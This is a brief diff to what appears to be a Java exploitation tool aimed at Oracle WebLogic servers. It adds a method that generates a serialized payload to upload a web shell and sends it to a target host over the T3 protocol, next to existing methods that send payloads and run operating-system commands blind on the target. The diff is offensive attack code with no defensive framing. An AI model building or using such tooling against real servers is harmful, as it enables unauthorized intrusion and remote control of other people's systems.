@@ -31,6 +31,11 @@ public class WebLogicOperation {
         T3ProtocolOperation.send(host, port, payload);
     }
 
+    public static void uploadFileShell(String host, String port) throws Exception {
+        byte[] payload = SerialDataGenerator.serialUploadShellDatas();
+        T3ProtocolOperation.send(host, port, payload);
+    }
+
     public static void blindExecute(String host, String port, String cmd) throws Exception {
         String[] cmds = new String[]{cmd};
         if (Main.cmdLine.hasOption("os")) {
